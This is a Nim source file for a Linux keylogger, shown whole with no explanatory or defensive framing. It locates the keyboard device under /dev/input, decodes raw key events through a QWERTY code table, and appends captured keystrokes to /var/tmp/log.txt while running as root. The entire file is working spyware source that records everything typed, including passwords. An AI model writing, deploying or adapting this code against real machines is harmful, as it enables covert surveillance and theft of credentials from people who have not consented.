import std/re
import struct
import os
import tables
import strutils

var 
  LOG_FILE = "/var/tmp/log.txt"
  BUFFER_SIZE = 256

proc toString(bytes: openArray[char]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

proc findKeyboard(): string =
  let f = open("/proc/bus/input/devices")
  defer: f.close()
  var 
    line: string
    handlers = newSeq[string]()
  while f.read_line(line):
    if contains(line, re"Handlers|EV="):
      handlers.add(line)

  for i in handlers.low .. handlers.high:
    if contains(handlers[i], re"EV=120013"):
      var 
        line = handlers[i-1]
        event = findAll(line, re"event[0-9]")[0]
        infile_path = "/dev/input/" & event
      return infile_path
  return "err"

proc readEvent(in_file: string) =
  var qwerty_map = {
    # https://github.com/torvalds/linux/blob/master/include/uapi/linux/input-event-codes.h
    2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9",
    11: "0", 12: "-", 13: "=", 14: "[BACKSPACE]", 15: "[TAB]", 16: "q", 17: "w",
    18: "e", 19: "r", 20: "t", 21: "y", 22: "u", 23: "i", 24: "o", 25: "p", 26: "[",
    27: "]", 28: "\n", 29: "[CTRL]", 30: "a", 31: "s", 32: "d", 33: "f", 34: "g",
    35: "h", 36: "j", 37: "k", 38: "l", 39: ";", 40: "'", 41: "`", 42: "[SHIFT]",
    43: "\\", 44: "z", 45: "x", 46: "c", 47: "v", 48: "b", 49: "n", 50: "m",
    51: ",", 52: ".", 53: "/", 54: "[SHIFT]", 55: "FN", 56: "[ALT]", 57: " ", 58: "[CAPSLOCK]",
    97: "[CTRL]", 100: "[ALT]", 102: "[HOME]", 103: "[UP]", 104: "[PAGEUP]", 105: "[LEFT]",
    106: "[RIGHT]", 107: "[END]", 108: "[DOWN]", 109: "[PAGEDOWN]", 110: "[INSERT]", 111: "[DELETE]",
  }.toTable

  let FORMAT = "qqHHI"
  var typed_buffer = ""

  let f = open(in_file)
  defer: f.close()
  while true:
    var buf: array[24, char]
    discard readChars(f, buf)

    var 
      result = unpack(FORMAT, toString(buf))
      keyType = parseInt($result[2])
      code = parseInt($result[3])
      value = parseInt($result[4])

    # Check if key is pressed
    if code != 0 and keyType == 1 and value == 1:
      try:
        typed_buffer.add(qwerty_map[code])
      except:
        continue

    # Check if key is released
    if code != 0 and keyType == 1 and value == 0:
      if code == 54:
        try:
          typed_buffer.add("[UNSHIFT]")
        except:
          continue
    
    if typed_buffer.len > BUFFER_SIZE:
      let f2 = open(LOG_FILE, fmAppend)
      defer: f2.close()
      f2.write(typed_buffer)
      typed_buffer = ""


when isMainModule:
  if not isAdmin():
    quit("Must run as root/admin")

  var infile_path = findKeyboard()

  if infile_path == "err":
    quit(1)

  readEvent(infile_path)

